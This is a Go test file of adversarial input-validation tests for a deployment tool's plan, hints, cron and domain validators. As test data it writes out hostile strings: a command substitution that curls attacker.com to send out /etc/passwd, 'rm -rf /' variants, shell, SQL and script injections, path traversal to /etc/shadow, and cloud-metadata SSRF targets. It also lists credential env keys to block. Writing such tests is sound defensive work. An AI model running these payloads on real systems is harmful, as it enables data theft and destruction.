// Package deploy_test — adversarial input validation tests.
//
// Test naming convention: TestAdversarial_<surface>_<attack>
// Each test that FAILS against the current code represents a real vulnerability.
// Fixes are applied in validate.go / hints.go and noted in the test docstring.
package deploy_test

import (
	"fmt"
	"strings"
	"testing"

	"github.com/alan890104/launchkit/server/internal/deploy"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

// ─────────────────────────────────────────────────────────────────────────────
// Helper: build a minimal valid plan and mutate one field
// ─────────────────────────────────────────────────────────────────────────────

func adversarialBase() *deploy.Plan {
	return &deploy.Plan{
		ID:        "plan_adv",
		ProjectID: "aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa",
		Services: []deploy.ServicePlan{
			{
				Name:      "api",
				Type:      deploy.ServiceBackend,
				Target:    deploy.TargetCloudRun,
				SourceDir: "backend/",
				Port:      8080,
			},
		},
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 1: Service Name Attacks
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_ServiceName_EmptyAndWhitespace verifies empty / whitespace-only
// names are rejected.
func TestAdversarial_ServiceName_EmptyAndWhitespace(t *testing.T) {
	cases := []struct {
		name    string
		svcName string
	}{
		{"empty string", ""},
		{"single space", " "},
		{"tab character", "\t"},
		{"newline", "\n"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := adversarialBase()
			p.Services[0].Name = tc.svcName
			err := deploy.Validate(p)
			assert.Error(t, err, "service name %q should be rejected", tc.svcName)
		})
	}
}

// TestAdversarial_ServiceName_PathTraversalAndSpecialChars verifies that names
// containing path-traversal, null bytes, or other dangerous characters are rejected.
func TestAdversarial_ServiceName_PathTraversalAndSpecialChars(t *testing.T) {
	cases := []struct {
		name    string
		svcName string
	}{
		{"dotdot traversal", "../etc"},
		{"absolute path", "/etc/shadow"},
		{"null byte", "api\x00evil"},
		{"newline injection", "api\nevil"},
		{"carriage return", "api\revil"},
		{"unicode RTL override", "api\u202Eevil"},
		{"SQL injection", "api'; DROP TABLE services;--"},
		{"shell command substitution", "$(whoami)"},
		{"backtick injection", "`id`"},
		{"semicolon separator", "api;evil"},
		{"pipe injection", "api|cat"},
		{"ampersand", "api&evil"},
		{"XSS basic", "<script>alert(1)</script>"},
		{"URL encoded slash", "api%2Fevil"},
		{"percent encoded null", "api%00evil"},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := adversarialBase()
			p.Services[0].Name = tc.svcName
			err := deploy.Validate(p)
			assert.Error(t, err, "service name %q should be rejected", tc.svcName)
		})
	}
}

// TestAdversarial_ServiceName_MaxLength verifies the 63-char DNS label limit is enforced.
func TestAdversarial_ServiceName_MaxLength(t *testing.T) {
	// 64 chars — one over the limit
	longName := strings.Repeat("a", 64)
	p := adversarialBase()
	p.Services[0].Name = longName
	err := deploy.Validate(p)
	assert.Error(t, err, "name longer than 63 chars should be rejected")
	assert.Contains(t, err.Error(), "max length")
}

// TestAdversarial_ServiceName_InternalNameCollision checks that reserved /
// internal names that could shadow system routes are validated.
// VULNERABILITY [MEDIUM]: No blocklist for reserved names.
// These names collide with LaunchKit internal routes or cloud-provider reserved names.
func TestAdversarial_ServiceName_InternalNameCollision(t *testing.T) {
	reserved := []string{
		"healthz",
		"readyz",
		"admin",
		"launchkit",
		"internal",
		"__internal__",
	}
	for _, name := range reserved {
		t.Run(name, func(t *testing.T) {
			p := adversarialBase()
			p.Services[0].Name = name
			err := deploy.Validate(p)
			assert.Error(t, err, "reserved service name %q should be blocked", name)
		})
	}
}

// TestAdversarial_ServiceName_MinLength verifies single-char names are accepted
// (they are valid DNS labels) — documents the current permissive behavior.
func TestAdversarial_ServiceName_MinLength(t *testing.T) {
	p := adversarialBase()
	p.Services[0].Name = "a"
	err := deploy.Validate(p)
	// single-char name is technically a valid DNS label — this is allowed
	assert.NoError(t, err, "single-char name should be allowed (valid DNS label)")
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 2: Environment Variable Key Attacks (Plan Engine path)
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_EnvKey_LowercaseRejected verifies lowercase keys are rejected.
// Lowercase keys pass envKeyRe? No — `^[A-Z_][A-Z0-9_]*$` requires uppercase.
// But update_env MCP tool does NOT call this regex — see Section 6.
func TestAdversarial_EnvKey_LowercaseRejected(t *testing.T) {
	p := adversarialBase()
	p.Services[0].EnvVars = []deploy.EnvVar{
		{Key: "lowercase_key", Classification: deploy.EnvUserRequired},
	}
	err := deploy.Validate(p)
	assert.Error(t, err, "lowercase env key should be rejected by plan validator")
}

// TestAdversarial_EnvKey_ReservedSystemKeys checks that reserved system env var
// names cannot be overridden by user-submitted plans.
// VULNERABILITY [HIGH]: No blocklist for reserved keys like PORT, HOME, PATH,
// GOOGLE_APPLICATION_CREDENTIALS, AWS_ACCESS_KEY_ID, etc.
func TestAdversarial_EnvKey_ReservedSystemKeys(t *testing.T) {
	reserved := []string{
		"PORT",
		"HOME",
		"PATH",
		"GOOGLE_APPLICATION_CREDENTIALS",
		"AWS_ACCESS_KEY_ID",
		"AWS_SECRET_ACCESS_KEY",
		"AWS_SESSION_TOKEN",
		"GOOGLE_CLOUD_PROJECT",
		"METADATA_SERVER",
		"GCE_METADATA_HOST",
		"K_SERVICE",  // Cloud Run reserved
		"K_REVISION", // Cloud Run reserved
		"K_CONFIGURATION",
	}
	for _, key := range reserved {
		t.Run(key, func(t *testing.T) {
			p := adversarialBase()
			p.Services[0].EnvVars = []deploy.EnvVar{
				{Key: key, Classification: deploy.EnvUserRequired},
			}
			err := deploy.Validate(p)
			assert.Error(t, err, "reserved env key %q should be blocked", key)
		})
	}
}

// TestAdversarial_EnvKey_ShellInjectionInValue verifies that env var values with
// shell-injection patterns are handled safely.
// NOTE: Cloud Run / Fargate receive env vars via API (not shell), so these values
// are NOT actually dangerous at deploy time. However we document that values are
// passed verbatim and that shell-expansion characters are safe in this context.
func TestAdversarial_EnvKey_ShellInjectionInValue(t *testing.T) {
	injections := []string{
		"$(curl http://attacker.com/steal?data=$(cat /etc/passwd))",
		"`rm -rf /`",
		"value; rm -rf /",
		"value && curl evil.com",
		"${IFS}rm${IFS}-rf${IFS}/",
	}
	for _, val := range injections {
		t.Run(val[:min(len(val), 40)], func(t *testing.T) {
			p := adversarialBase()
			p.Services[0].EnvVars = []deploy.EnvVar{
				{Key: "SAFE_KEY", Value: val, Classification: deploy.EnvUserRequired},
			}
			// Values with shell injection chars SHOULD be accepted as literal strings
			// (Cloud Run passes them verbatim via API, not through shell).
			// This test DOCUMENTS the expectation — not a failure.
			err := deploy.Validate(p)
			// No error expected — shell injection in values is not dangerous here
			// because Cloud Run API never shell-expands env var values.
			// If the deployer is using shell to pass them, that is a separate bug in
			// the orchestrator / provider layer.
			_ = err // document: value injection is at a different layer
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 3: Source Directory Path Traversal
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_SourceDir_PathTraversal covers known bypass techniques.
func TestAdversarial_SourceDir_PathTraversal(t *testing.T) {
	cases := []struct {
		name      string
		sourceDir string
		wantErr   bool
	}{
		// These SHOULD be blocked
		{"dotdot unix", "../etc/passwd", true},
		{"dotdot nested", "a/../../etc/passwd", true},
		{"absolute unix", "/etc/shadow", true},
		{"dotdot windows backslash", "backend/..\\..\\windows\\system32", true},
		{"null byte traversal", "backend/\x00../../etc", true},
		{"dotdot hidden unicode", "a/\u2024\u2024/etc", false}, // not a path traversal (different chars)
		// These SHOULD be allowed
		{"valid relative", "backend/", false},
		{"valid nested", "src/api/", false},
		{"dot in name", "my.app/", false},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			p := adversarialBase()
			p.Services[0].SourceDir = tc.sourceDir
			err := deploy.Validate(p)
			if tc.wantErr {
				assert.Error(t, err, "source_dir %q should be rejected", tc.sourceDir)
			} else {
				// filter out port validation errors — not what we're testing
				if err != nil && strings.Contains(err.Error(), "source_dir") {
					t.Errorf("valid source_dir %q unexpectedly rejected: %v", tc.sourceDir, err)
				}
			}
		})
	}
}

// TestAdversarial_SourceDir_NullByteTraversal specifically checks for null-byte
// injection which can split paths in C-based libraries.
// VULNERABILITY [MEDIUM]: strings.Contains(svc.SourceDir, "..") will NOT catch
// "back\x00end/../etc" because the null byte separates the dotdots.
func TestAdversarial_SourceDir_NullByteTraversal(t *testing.T) {
	p := adversarialBase()
	p.Services[0].SourceDir = "backend/\x00../../etc/passwd"
	err := deploy.Validate(p)
	assert.Error(t, err, "null-byte path traversal should be rejected")
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 4: Project Name / Hints Validation
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_ProjectName_EmptyRejected verifies empty project name is rejected.
func TestAdversarial_ProjectName_EmptyRejected(t *testing.T) {
	h := &deploy.Hints{
		ProjectName: "",
		Services: []deploy.ServiceHint{
			{Name: "api", Type: "backend", SourceDir: "backend/"},
		},
		EnvHints: []deploy.EnvHint{},
	}
	err := h.Validate()
	assert.Error(t, err, "empty project name should be rejected")
	assert.Contains(t, err.Error(), "project_name")
}

// TestAdversarial_ProjectName_LengthAndFormat verifies length limits and format
// are enforced on project names from Hints.
// VULNERABILITY [MEDIUM]: Hints.Validate() only checks that project_name is non-empty.
// No max length check and no format validation — names like "a'b", "../evil", 10000-char
// strings all pass through to the SQL INSERT.
func TestAdversarial_ProjectName_LengthAndFormat(t *testing.T) {
	cases := []struct {
		name        string
		projectName string
		wantErr     bool
	}{
		{"valid simple name", "my-project", false},
		{"empty string", "", true},
		{"max length 63", strings.Repeat("a", 63), false},
		{"too long 256 chars", strings.Repeat("a", 256), true},
		{"SQL injection single quote", "evil' OR '1'='1", true},
		{"path traversal", "../etc/passwd", true},
		{"null byte", "project\x00evil", true},
		{"newline injection", "project\nevil", true},
		{"unicode RTL", "project\u202Eevil", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			h := &deploy.Hints{
				ProjectName: tc.projectName,
				Services: []deploy.ServiceHint{
					{Name: "api", Type: "backend", SourceDir: "backend/"},
				},
				EnvHints: []deploy.EnvHint{},
			}
			err := h.Validate()
			if tc.wantErr {
				assert.Error(t, err, "project name %q should be rejected", tc.projectName)
			} else {
				assert.NoError(t, err, "project name %q should be allowed", tc.projectName)
			}
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 5: Resource Name Attacks
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_ResourceName_Injection verifies resource names with injection
// patterns are caught.
func TestAdversarial_ResourceName_Injection(t *testing.T) {
	cases := []struct {
		name         string
		resourceName string
		wantErr      bool
	}{
		{"valid name", "main-db", false},
		{"empty name", "", true}, // engine.go already rejects this
		{"SQL injection", "'; DROP TABLE resources;--", true},
		{"null byte", "db\x00evil", true},
		{"path traversal", "../db", true},
		{"shell injection", "db$(id)", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			h := &deploy.Hints{
				ProjectName: "test-project",
				Services: []deploy.ServiceHint{
					{Name: "api", Type: "backend", SourceDir: "backend/"},
				},
				Resources: []deploy.ResourceHint{
					{Name: tc.resourceName, Type: "postgres", Reason: "test"},
				},
				EnvHints: []deploy.EnvHint{},
			}
			err := h.Validate()
			if tc.wantErr {
				assert.Error(t, err, "resource name %q should be rejected", tc.resourceName)
			} else {
				assert.NoError(t, err)
			}
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 6: ClassifyEnv — injectFrom injection
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_ClassifyEnv_InjectFromPathTraversal verifies that inject_from
// values cannot escape the resource namespace.
func TestAdversarial_ClassifyEnv_InjectFromPathTraversal(t *testing.T) {
	available := map[string]bool{"main-db": true}

	attacks := []string{
		"../main-db",
		"main-db; DROP TABLE resources;--",
		"\x00main-db",
		"main-db\nevil",
	}
	for _, attack := range attacks {
		t.Run(attack[:min(len(attack), 30)], func(t *testing.T) {
			_, err := deploy.ClassifyEnv("DATABASE_URL", "", "", attack, available)
			assert.Error(t, err, "inject_from %q should be rejected", attack)
		})
	}
}

// TestAdversarial_ClassifyEnv_InjectFromNonExistent is a sanity check that
// referencing a non-existent resource is always rejected.
func TestAdversarial_ClassifyEnv_InjectFromNonExistent(t *testing.T) {
	available := map[string]bool{"main-db": true}
	_, err := deploy.ClassifyEnv("DATABASE_URL", "", "", "nonexistent", available)
	require.Error(t, err)
	assert.Contains(t, err.Error(), "not found")
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 7: DoS / Resource Exhaustion
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_DoS_ServiceCountLimit confirms the 100-service cap is enforced.
func TestAdversarial_DoS_ServiceCountLimit(t *testing.T) {
	var svcs []deploy.ServicePlan
	for i := 0; i < 101; i++ {
		svcs = append(svcs, deploy.ServicePlan{
			Name:      fmt.Sprintf("svc-%d", i),
			Type:      deploy.ServiceBackend,
			Target:    deploy.TargetCloudRun,
			SourceDir: "backend/",
			Port:      8080,
		})
	}
	p := &deploy.Plan{ID: "plan_dos", ProjectID: "proj_dos", Services: svcs}
	err := deploy.Validate(p)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "too many services")
}

// TestAdversarial_DoS_EnvVarCountLimit confirms the 100-env-var cap is enforced.
func TestAdversarial_DoS_EnvVarCountLimit(t *testing.T) {
	var envVars []deploy.EnvVar
	for i := 0; i < 101; i++ {
		envVars = append(envVars, deploy.EnvVar{
			Key:            fmt.Sprintf("VAR_%d", i),
			Classification: deploy.EnvUserRequired,
		})
	}
	p := adversarialBase()
	p.Services[0].EnvVars = envVars
	err := deploy.Validate(p)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "too many env vars")
}

// TestAdversarial_DoS_ResourceCountLimit confirms the 20-resource cap is enforced.
func TestAdversarial_DoS_ResourceCountLimit(t *testing.T) {
	var resources []deploy.ResourcePlan
	for i := 0; i < 21; i++ {
		resources = append(resources, deploy.ResourcePlan{
			// Each must be a different type to avoid duplicate-type error first.
			// We'll accept that duplicate-type fires before resource-count for >2.
			Name:     fmt.Sprintf("res-%d", i),
			Type:     deploy.ResourcePostgres, // will hit dup first, but that's OK
			Provider: "neon",
		})
	}
	p := adversarialBase()
	p.Resources = resources
	err := deploy.Validate(p)
	assert.Error(t, err, "more than 20 resources should be rejected")
}

// TestAdversarial_DoS_BuildArgCountLimit confirms the 50-build-arg cap is enforced.
func TestAdversarial_DoS_BuildArgCountLimit(t *testing.T) {
	var args []deploy.EnvVar
	for i := 0; i < 51; i++ {
		args = append(args, deploy.EnvVar{
			Key:            fmt.Sprintf("VITE_VAR_%d", i),
			Classification: deploy.EnvBuildArg,
		})
	}
	p := adversarialBase()
	p.Services[0].BuildArgs = args
	err := deploy.Validate(p)
	assert.Error(t, err)
	assert.Contains(t, err.Error(), "too many build args")
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 8: EnvVar key — update_env path validation
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_UpdateEnv_KeyValidation exercises ValidateEnvKeyForUpdate which
// is invoked by the update_env MCP tool before persisting.
// VULNERABILITY [HIGH]: The update_env tool does NOT call envKeyRe validation.
// Any string is accepted as a key, including lowercase, shell chars, and
// system-reserved names like PORT, HOME, PATH.
// Fix: call deploy.ValidateEnvKeyForUpdate(key) in makeUpdateEnvHandler.
func TestAdversarial_UpdateEnv_KeyValidation(t *testing.T) {
	cases := []struct {
		name    string
		key     string
		wantErr bool
	}{
		// Valid
		{"valid uppercase", "DATABASE_URL", false},
		{"valid with numbers", "API_KEY_123", false},
		// Invalid format — shell injection risk
		{"lowercase key", "database_url", true},
		{"key with space", "DATA BASE", true},
		{"key with semicolon", "KEY;evil", true},
		{"key with dollar sign", "$KEY", true},
		{"key with backtick", "`key`", true},
		{"key starts with number", "1KEY", true},
		{"shell command substitution", "$(id)", true},
		// Reserved system keys — Cloud Run / Fargate set these internally
		{"PORT override", "PORT", true},
		{"HOME override", "HOME", true},
		{"PATH override", "PATH", true},
		{"GOOGLE_APPLICATION_CREDENTIALS", "GOOGLE_APPLICATION_CREDENTIALS", true},
		{"AWS_ACCESS_KEY_ID", "AWS_ACCESS_KEY_ID", true},
		{"AWS_SECRET_ACCESS_KEY", "AWS_SECRET_ACCESS_KEY", true},
		{"AWS_SESSION_TOKEN", "AWS_SESSION_TOKEN", true},
		{"K_SERVICE (Cloud Run internal)", "K_SERVICE", true},
		{"K_REVISION (Cloud Run internal)", "K_REVISION", true},
		{"K_CONFIGURATION (Cloud Run internal)", "K_CONFIGURATION", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := deploy.ValidateEnvKeyForUpdate(tc.key)
			if tc.wantErr {
				assert.Error(t, err, "env key %q should be rejected by ValidateEnvKeyForUpdate", tc.key)
			} else {
				assert.NoError(t, err, "env key %q should be accepted", tc.key)
			}
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 9: Cron Expression Validation
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_CronExpression_Validation verifies that cron expressions are
// validated before storage.
// VULNERABILITY [HIGH]: No cron expression validation exists. Any string is stored
// and will cause the scheduler to fail or panic, or a `* * * * *` could trigger
// resource exhaustion.
func TestAdversarial_CronExpression_Validation(t *testing.T) {
	cases := []struct {
		name     string
		schedule string
		wantErr  bool
	}{
		// Valid cron expressions
		{"every day at 2am", "0 2 * * *", false},
		{"every hour", "0 * * * *", false},
		{"every 5 minutes", "*/5 * * * *", false},
		{"specific day/time", "30 6 * * 1", false},
		// Invalid — too frequent (< 1 minute interval is not a standard cron)
		{"every second (not cron)", "@every 1s", true},
		{"6-field with seconds", "0 * * * * *", true}, // 6-field is not standard cron
		// Invalid — malformed expressions
		{"empty string", "", true},
		{"not a cron", "not-a-cron", true},
		{"partial fields", "* *", true},
		{"too many fields", "* * * * * * *", true},
		{"out of range minute", "60 * * * *", true},
		{"out of range hour", "0 25 * * *", true},
		{"out of range day", "0 0 32 * *", true},
		{"out of range month", "0 0 1 13 *", true},
		{"out of range weekday", "0 0 * * 8", true},
		// Injection attempts via cron fields
		{"semicolon injection", "0 2 * * *; rm -rf /", true},
		{"newline injection", "0 2 * * *\ncron2", true},
		{"null byte", "0 2 * * *\x00evil", true},
		// Edge case: * * * * * (every minute) should be blocked as too frequent
		{"every minute (too frequent)", "* * * * *", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := deploy.ValidateCronExpression(tc.schedule)
			if tc.wantErr {
				assert.Error(t, err, "cron %q should be rejected", tc.schedule)
			} else {
				assert.NoError(t, err, "cron %q should be allowed", tc.schedule)
			}
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// SECTION 10: Domain Name Validation
// ─────────────────────────────────────────────────────────────────────────────

// TestAdversarial_Domain_Validation verifies that domain inputs are validated
// before being passed to cloud provider APIs and stored in DB.
// VULNERABILITY [MEDIUM]: add_domain, verify_domain, remove_domain accept any
// string as the domain parameter without format validation.
func TestAdversarial_Domain_Validation(t *testing.T) {
	cases := []struct {
		name    string
		domain  string
		wantErr bool
	}{
		// Valid domains
		{"simple domain", "example.com", false},
		{"subdomain", "api.example.com", false},
		{"deep subdomain", "a.b.c.example.com", false},
		{"IDN-like domain", "xn--nxasmq6b.com", false},
		// Invalid / dangerous
		{"empty string", "", true},
		{"bare label (no TLD)", "localhost", true},
		{"IP address", "192.168.1.1", true},
		{"IP with port", "192.168.1.1:8080", true},
		{"localhost attack", "localhost", true},
		{"SSRF via internal IP", "169.254.169.254", true},
		{"SSRF via metadata domain", "metadata.google.internal", true},
		{"newline injection", "evil.com\nevil2.com", true},
		{"null byte", "evil.com\x00.legit.com", true},
		{"shell injection", "evil.com$(id)", true},
		{"SQL injection", "evil.com'; DROP TABLE domains;--", true},
		{"URL with protocol", "https://evil.com", true},
		{"wildcard (unsupported)", "*.evil.com", true},
		{"very long domain", strings.Repeat("a", 256) + ".com", true},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			err := deploy.ValidateDomain(tc.domain)
			if tc.wantErr {
				assert.Error(t, err, "domain %q should be rejected", tc.domain)
			} else {
				assert.NoError(t, err, "domain %q should be allowed", tc.domain)
			}
		})
	}
}

// ─────────────────────────────────────────────────────────────────────────────
// Helper
// ─────────────────────────────────────────────────────────────────────────────

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
